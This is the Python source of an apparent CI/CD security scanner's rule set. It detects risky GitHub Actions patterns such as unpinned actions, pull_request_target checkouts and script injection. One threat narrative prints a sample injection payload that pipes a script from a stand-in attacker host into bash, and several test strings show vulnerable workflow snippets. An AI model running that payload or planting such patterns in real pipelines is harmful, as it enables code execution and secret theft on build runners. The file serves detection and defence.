"""GitHub Actions security rules — Dependency Chain Abuse and Poisoned Pipeline Execution.

These two categories cover the exact attack vectors used in documented supply chain campaigns.
"""

from taintly.models import (
    _YAML_BOOL_FALSE,
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

RULES: list[Rule] = [
    # =========================================================================
    # CICD-SEC-3: Dependency Chain Abuse
    # =========================================================================
    Rule(
        id="SEC3-GH-001",
        title="Unpinned action (mutable tag reference)",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Action referenced by mutable tag instead of commit SHA. Tags can be "
            "force-pushed to point at malicious code — a technique used in documented "
            "supply chain attacks against popular GitHub Actions (Trivy, Checkmarx, tj-actions)."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*([^@\s]+)@(?![a-f0-9]{40}\b)(\S+)",
            exclude=[
                r"^\s*#",
                r"docker://",
                r"uses:\s*\./",
                r"uses:\s*\.\./",
                # Dedup: branch refs (main/master/develop/dev) are already reported
                # at CRITICAL by SEC3-GH-002. Don't double-count as HIGH here too.
                r"uses:\s*[^@\s]+@(main|master|develop|dev)(\s|#|$)",
            ],
        ),
        remediation="Pin to full 40-char commit SHA: uses: org/action@<sha> # vtag",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
        test_positive=[
            "      - uses: actions/checkout@v4",
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            "      uses: actions/setup-node@v3.1.2",
        ],
        test_negative=[
            "      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4",
            "      - uses: ./local-action",
            "      - uses: ../shared-action",
            "      # uses: actions/checkout@v4",
            "      - uses: docker://alpine:3.18",
        ],
        stride=["T"],
        threat_narrative=(
            "Mutable tags can be force-pushed to point at entirely different commits without any "
            "record in your repository's history, silently changing what code your pipeline executes. "
            "This technique was used in the Trivy, tj-actions/changed-files, and Checkmarx supply "
            "chain compromises of 2024-2026."
        ),
        incidents=[
            "Trivy supply chain (Mar 2026)",
            "tj-actions/changed-files (Mar 2025)",
            "Checkmarx (Mar 2025)",
        ],
    ),
    Rule(
        id="SEC3-GH-002",
        title="Action pinned to branch reference",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Action referenced by branch name (e.g., @main, @master). Branch references "
            "change with every commit — any push to the branch changes what your workflow runs. "
            "This is the most dangerous form of unpinned reference."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*[^@\s]+@(main|master|develop|dev)(\s*(#.*)?)?\s*$",
            exclude=[r"^\s*#", r"docker://", r"uses:\s*\./"],
        ),
        remediation="Pin to a specific commit SHA, not a branch name.",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
        test_positive=[
            "      - uses: some-org/deploy@main",
            "      - uses: company/action@master",
            "      - uses: org/tool@develop",
        ],
        test_negative=[
            "      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1",
            "      - uses: actions/checkout@v4",
            "      # uses: org/action@main",
        ],
        stride=["T"],
        threat_narrative=(
            "Branch references change with every commit, meaning any contributor to the action's "
            "repository can silently modify what your workflow runs by pushing a single commit. "
            "An attacker who gains temporary write access — via a compromised maintainer account — "
            "can substitute malicious code that runs with your workflow's full permissions and secrets."
        ),
    ),
    Rule(
        id="SEC3-GH-003",
        title="Known compromised action referenced",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "This workflow references an action that has been compromised in a documented "
            "supply chain attack. Verify you are using a confirmed safe version pinned to SHA."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*(aquasecurity/trivy-action|aquasecurity/setup-trivy|Checkmarx/kics-github-action|Checkmarx/ast-github-action|tj-actions/changed-files)@",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Consult the authoritative GitHub Security Advisory for each incident before "
            "re-enabling the action. Relevant advisories:\n"
            "  - tj-actions/changed-files: GHSA-mrrh-fwg8-r2c3 / CVE-2025-30066\n"
            "  - aquasecurity/trivy-action: GHSA-69fq-xp46-6x23 (Mar 2026)\n"
            "  - Checkmarx/kics-github-action: published via the GitHub Advisory Database\n"
            "Browse: https://github.com/advisories\n"
            "\n"
            "Pin to a confirmed-safe 40-char commit SHA published after remediation, or "
            "replace with an alternative tool. Audit the workflow's full history for the "
            "window the action was present — rotate any secret that the compromised "
            "version could have exfiltrated."
        ),
        reference="https://github.com/advisories",
        test_positive=[
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            "      - uses: tj-actions/changed-files@v35",
            "      - uses: Checkmarx/kics-github-action@v1.7.0",
        ],
        test_negative=[
            "      - uses: actions/checkout@v4",
            "      # uses: aquasecurity/trivy-action@v0.33.0",
        ],
        stride=["T", "I"],
        threat_narrative=(
            "This action was used in a confirmed supply chain attack where attackers modified it "
            "to silently exfiltrate CI secrets from all referencing workflows. "
            "Continuing to reference it keeps a known-compromised actor in your trust chain, "
            "even if you pin to a version predating the incident."
        ),
        incidents=[
            "Trivy supply chain (Mar 2026)",
            "tj-actions/changed-files (Mar 2025)",
            "Checkmarx (Mar 2025)",
        ],
    ),
    Rule(
        id="SEC3-GH-005",
        title="Docker container action without digest pinning",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Docker image referenced by tag instead of SHA256 digest. Image tags are mutable "
            "and can be overwritten on the registry."
        ),
        pattern=RegexPattern(
            match=r"(image|uses):\s*docker://[^@\s]+(?!.*@sha256:)",
            exclude=[r"^\s*#", r"@sha256:"],
        ),
        remediation="Pin Docker images to digest: docker://alpine@sha256:abcdef...",
        reference="https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier",
        test_positive=[
            "      uses: docker://alpine:3.18",
            "      image: docker://node:20-slim",
        ],
        test_negative=[
            "      uses: docker://alpine@sha256:abcdef1234567890abcdef1234567890",
            "      # uses: docker://alpine:3.18",
        ],
        stride=["T"],
        threat_narrative=(
            "Image tags are mutable pointers: registry operators or attackers who compromise the "
            "image repository can push a new image under the same tag, replacing your job's execution "
            "environment without any visible change in your workflow file. "
            "A compromised container image executes with full access to all runner secrets, "
            "source code, and build artifacts."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution
    # =========================================================================
    Rule(
        id="SEC4-GH-001",
        title="pull_request_target with untrusted PR checkout",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target AND checks out the PR author's code. "
            "This is the exact attack vector used in the Trivy supply chain compromise (March 2026). "
            "Attacker-controlled code executes with access to repo secrets and write permissions."
        ),
        pattern=ContextPattern(
            anchor=r"pull_request_target",
            requires=r"github\.event\.pull_request\.head\.(sha|ref)",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use 'pull_request' trigger instead. If secrets are required, use a two-workflow "
            "pattern: pull_request for build/test, workflow_run for privileged operations."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}",
        ],
        test_negative=[
            "on:\n  pull_request:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4",
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - run: echo 'just a comment'",
        ],
        stride=["E", "I"],
        threat_narrative=(
            "pull_request_target runs with the base repository's write permissions and full secret "
            "access, and checking out the PR author's code gives an external contributor arbitrary "
            "code execution in that privileged context. "
            "This is the exact pattern exploited in the March 2026 Trivy supply chain attack to "
            "exfiltrate repository secrets at scale from thousands of repositories."
        ),
        incidents=["Trivy supply chain (Mar 2026)", "Ultralytics (Dec 2024)"],
    ),
    Rule(
        id="SEC4-GH-002",
        title="pull_request_target trigger detected",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target which runs with write access to the base repo "
            "and access to secrets. Even without PR checkout, this trigger is inherently risky. "
            "Any future modification could introduce a PPE vulnerability."
        ),
        pattern=RegexPattern(
            match=r"pull_request_target",
            exclude=[r"^\s*#"],
        ),
        remediation="Use 'pull_request' trigger if write access is not required.",
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "  pull_request_target:",
            "    pull_request_target:",
            "on: [pull_request_target]",
        ],
        test_negative=[
            "  pull_request:",
            "  # pull_request_target:",
        ],
        stride=["E"],
        threat_narrative=(
            "pull_request_target grants write repository access and exposes secrets to all workflow "
            "steps, unlike pull_request which runs in a read-only context. "
            "Even without explicit PR code checkout today, any future careless modification of this "
            "workflow — such as adding actions/checkout — becomes a critical PPE vulnerability."
        ),
        incidents=["Trivy supply chain (Mar 2026)"],
    ),
    Rule(
        id="SEC4-GH-003",
        title="workflow_run without conclusion check",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow triggers on workflow_run but doesn't verify the triggering workflow "
            "succeeded. May process tainted artifacts from failed/compromised workflows."
        ),
        pattern=ContextPattern(
            anchor=r"workflow_run",
            requires=r"workflow_run",
            requires_absent=r"workflow_run\.conclusion",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Gate the triggered job on the upstream conclusion AND treat every artefact "
            "from the triggering workflow as untrusted — a successful `workflow_run` can "
            "still receive head_sha / artefacts produced by fork code:\n"
            "\n"
            "jobs:\n"
            "  deploy:\n"
            "    if: github.event.workflow_run.conclusion == 'success'\n"
            "    steps:\n"
            "      # Check out the BASE repo SHA, not github.event.workflow_run.head_sha\n"
            "      - uses: actions/checkout@<pinned-sha>\n"
            "        with:\n"
            "          ref: ${{ github.event.workflow_run.head_repository.default_branch }}\n"
            "      # Download artefacts into a scratch dir and validate before use\n"
            "      - uses: actions/download-artifact@<pinned-sha>\n"
            "        with:\n"
            "          path: ./untrusted/\n"
            "      - run: ./scripts/validate-artifacts.sh ./untrusted/\n"
            "\n"
            "See the GitHub Security Lab write-up on preventing `workflow_run` pwn "
            "requests for the full threat model."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: deploy.sh",
        ],
        test_negative=[
            "on:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest",
            "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\njobs:\n  deploy:\n    if: github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest",
        ],
        stride=["T"],
        threat_narrative=(
            "Processing artifacts from a failed or inconclusive upstream workflow may consume "
            "build outputs produced under compromised or partial conditions. "
            "An attacker who can trigger the upstream workflow to fail after partially completing "
            "can produce tainted artifacts that the privileged downstream workflow then ships."
        ),
    ),
    Rule(
        id="SEC4-GH-004",
        title="Script injection via attacker-controlled GitHub context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "User-controlled value injected directly into a run: block via ${{ }} expression. "
            "Attacker can craft PR titles, issue bodies, branch names, or commit messages "
            "containing shell commands that execute in the runner context."
        ),
        pattern=RegexPattern(
            match=r"\$\{\{\s*github\.(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body|review\.body|head_commit\.(message|author\.(email|name))|commits|pages)|head_ref)",
            exclude=[
                r"^\s*#",
                r"^\s*if:",
                # Exclude lines where the attacker-controlled value is the entire value of a YAML
                # key — e.g. `ref: ${{ github.head_ref }}` in a `with:` block passes a string to
                # an action, it does NOT execute shell code. The dangerous pattern is embedding
                # ${{ }} inside a larger string that gets passed to `run:`.
                r"""^\s*[\w.-]+:\s*["']?\$\{\{[^}]*\}\}["']?\s*(#.*)?$""",
            ],
        ),
        remediation=(
            "Pass the value through an environment variable so the "
            "${{ }} interpolation expands into the runner's env map, "
            "not into the generated step script:\n"
            "env:\n  TITLE: ${{ github.event.pull_request.title }}\n"
            'run: echo "$TITLE"\n'
            "For values passed to downstream tools that interpret their "
            "input (git, url construction, sqlite), validate against an "
            "allowlist after the env-var step. Run "
            "`taintly --guide SEC4-GH-004` for the full "
            "injection-vs-downstream-sanitization model."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "${{ github.event.pull_request.title }}"',
            '        run: echo "${{ github.event.issue.body }}"',
            "        run: git checkout ${{ github.head_ref }}",
        ],
        test_negative=[
            '        if: github.event.pull_request.title != ""',
            '        run: echo "$TITLE"',
            '        # run: echo "${{ github.event.pull_request.title }}"',
            # ref: in a with: block is an action string param, not a shell command
            "        with:\n          ref: ${{ github.head_ref }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker can craft a PR title, issue body, or branch name containing shell "
            "metacharacters — such as `'; curl attacker.com/c2.sh | bash #` — that execute as "
            "commands when the value is interpolated into a run: block. "
            "The injected commands run with the workflow's full permissions including write access "
            "and all bound secrets."
        ),
        incidents=["Ultralytics (Dec 2024)", "Langflow (2024)"],
    ),
    Rule(
        id="SEC4-GH-005",
        title="Checkout persists credentials to disk",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "actions/checkout persists the GITHUB_TOKEN by default "
            "(`persist-credentials: true`). v4+ writes the token into a helper file "
            "under $RUNNER_TEMP and configures `.git/config` to reference it, so any "
            "subsequent step — including third-party actions — can read the token off "
            "disk and reuse it against the GitHub API without going through the secrets "
            "facility. Set `persist-credentials: false` unless the job needs to push "
            "commits from this clone."
        ),
        pattern=SequencePattern(
            pattern_a=r"uses:\s*actions/checkout@",
            absent_within=rf"persist-credentials:\s*{_YAML_BOOL_FALSE}",
            lookahead_lines=8,
            exclude=[r"^\s*#"],
        ),
        remediation="Add 'persist-credentials: false' to the checkout step.",
        reference="https://github.com/actions/checkout#usage",
        test_positive=[
            "      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0",
            "      - uses: actions/checkout@abc123def456abc123def456abc123def456abc1",
        ],
        test_negative=[
            "      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false",
            "      - uses: actions/checkout@v4\n        with:\n          persist-credentials: no",
            "      - uses: actions/checkout@v4\n        with:\n          persist-credentials: 'false'",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "The GITHUB_TOKEN persisted by actions/checkout (stored in a file under "
            "$RUNNER_TEMP and referenced from .git/config on v4+) can be read by any "
            "subsequent step — including third-party actions — from the filesystem "
            "without any secrets API call. With write repository permissions, a token "
            "extracted this way can push malicious commits, modify branch protections, "
            "or inject code into other workflows."
        ),
    ),
]
